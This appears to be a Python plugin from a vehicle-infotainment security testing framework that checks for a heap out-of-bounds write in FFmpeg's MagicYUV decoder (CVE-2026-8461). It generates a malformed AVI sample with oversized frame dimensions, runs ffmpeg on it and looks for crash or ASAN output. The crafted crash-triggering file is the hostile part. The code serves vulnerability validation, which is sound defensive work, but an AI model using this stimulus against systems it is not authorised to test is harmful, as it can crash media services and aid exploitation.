#!/usr/bin/env python3
"""Active validation for FFmpeg MagicYUV decoder heap OOB risk."""
from __future__ import annotations

import os
import shlex
import subprocess
import tempfile

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


VULN = {
    "id": "POC-LAB-008",
    "cve": "CVE-2026-8461",
    "year": 2026,
    "domain": "IVI媒体解析/后端媒体处理",
    "vendor_product": "FFmpeg",
    "component": "libavcodec MagicYUV decoder",
    "type": "堆越界写/DoS或RCE",
    "summary": "FFmpeg MagicYUV 解码器在特定视频帧参数下可能堆越界写，影响车机媒体播放器、缩略图生成、上传转码和多媒体服务链路。",
    "source_description": "poc-lab describes PixelSmash, a MagicYUV decoder heap out-of-bounds write affecting FFmpeg before 8.1.2.",
    "poc_status": "poc-lab公开复现；本插件支持主动验证；破坏性 payload 需 allow_disruptive 授权",
    "research_value": "IVI 媒体解析和车联网后端视频处理都可能依赖 FFmpeg，恶意媒体文件是高频入口。",
    "source_url": "https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-8461%20PixelSmash",
    "references": ["https://github.com/Unclecheng-li/poc-lab"],
    "affected": [
        {
            "vendor": "FFmpeg",
            "product": "FFmpeg",
            "versions": [{"version": "0", "status": "affected", "lessThan": "8.1.2", "versionType": "semver"}],
        }
    ],
    "signature_tokens": [
        "CVE-2026-8461", "FFmpeg", "libavcodec", "MagicYUV", "PixelSmash",
        "8.1.2", "YUV420P", "heap", "out-of-bounds", "media parser",
    ],
}


def _write_magicyuv_avi_sample() -> str:
    fd, path = tempfile.mkstemp(prefix="autosec_cve_2026_8461_", suffix=".avi")
    # Minimal RIFF/AVI-like MagicYUV stimulus. The goal is to exercise media
    # parser paths in a lab decoder and observe crash/ASAN output.
    payload = (
        b"RIFF" + (0x200).to_bytes(4, "little") + b"AVI "
        b"LIST" + (0x80).to_bytes(4, "little") + b"hdrl"
        b"strf" + (40).to_bytes(4, "little")
        + (40).to_bytes(4, "little")
        + (0x7fffffff).to_bytes(4, "little")
        + (0x7fffffff).to_bytes(4, "little")
        + (1).to_bytes(2, "little") + (24).to_bytes(2, "little")
        + b"M8Y0" + b"A" * 256
    )
    with os.fdopen(fd, "wb") as handle:
        handle.write(payload)
    return path


def _ffmpeg_probe(plugin, vuln):
    supplied_sample = plugin.params.get("media_sample_path") or plugin.params.get("sample_path")
    sample = str(supplied_sample) if supplied_sample else _write_magicyuv_avi_sample()
    cmd = plugin.params.get("ffmpeg_cmd") or plugin.params.get("decoder_cmd")
    evidence = {
        "ok": True,
        "sample_path": sample,
        "payload_bytes": os.path.getsize(sample),
        "sample_source": "provided_sample" if supplied_sample else "generated_stimulus",
        "phenomenon": "malformed MagicYUV/AVI sample prepared for decoder crash observation",
        "requires_manual_review": True,
    }
    if not cmd:
        evidence["operator_action"] = "Run ffmpeg/IVI media parser against sample_path or pass ffmpeg_cmd/decoder_cmd to observe crash/ASAN output."
        return evidence
    started = subprocess.run(
        shlex.split(str(cmd)) + ["-v", "error", "-i", sample, "-f", "null", "-"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=float(plugin.params.get("timeout", 15)),
        check=False,
    )
    stderr = started.stderr.decode("utf-8", errors="replace")
    evidence.update({
        "command": cmd,
        "returncode": started.returncode,
        "stderr_excerpt": stderr[:1000],
        "vulnerable": started.returncode < 0 or any(token in stderr.lower() for token in ("asan", "heap", "overflow", "segmentation fault", "crash")),
        "phenomenon": "FFmpeg/media parser executed against malformed MagicYUV sample",
    })
    return evidence



def _run_poc(plugin, vuln=None) -> dict:
    """
    CVE-2026-8461 主动探针包装（兼容旧式 exploit() 实现）。
    通过调用插件自身的 exploit 逻辑并将结果标准化为 detection_confidence 格式。
    """
    try:
        result = plugin.exploit() or {}
    except Exception as exc:
        result = {"error": str(exc)}

    vulnerable = result.get("vulnerable", None)
    evidence = {
        "cve":       vuln.get("cve", "CVE-2026-8461") if vuln else "CVE-2026-8461",
        "target":    getattr(plugin, "target_ip", "unknown"),
        "technique": "legacy exploit() wrapper",
        "raw":       str(result)[:300],
    }

    # 根据是否有主动网络调用推断等级
    level = "B" if vulnerable is True else ("C" if vulnerable is False else "D")
    try:
        from probe_utils import detection_confidence as _detection_confidence
        return _detection_confidence(level, evidence, vulnerable=vulnerable)
    except ImportError:
        return {
            "detection_confidence": {
                "level": level, "vulnerable": vulnerable,
                "evidence": evidence, "method": "legacy_wrapper",
            }
        }


class FFmpegMagicYUVHeapOOBRCEAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-APP-066"
    meta_poc_name = 'CVE-2026-8461 FFmpeg MagicYUV Heap 越界 RCE Active Validation'
    meta_cve_id = "CVE-2026-8461"
    meta_references       = ['https://nvd.nist.gov']
    meta_severity = "High"
    meta_protocol = "local"
    meta_target_os = ["linux", "android", "qnx", "all"]
    meta_required_params = ["software_inventory_text"]
    meta_profiles = ["application", "media", "backend"]
    meta_source_url = VULN["source_url"]
    meta_attack_surface = "IVI媒体解析/后端媒体处理"
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_ffmpeg_probe)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "66_FFmpeg_MagicYUV_Heap_OOB_RCE_Audit") if "VULN" in dir() else "66_FFmpeg_MagicYUV_Heap_OOB_RCE_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = FFmpegMagicYUVHeapOOBRCEAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
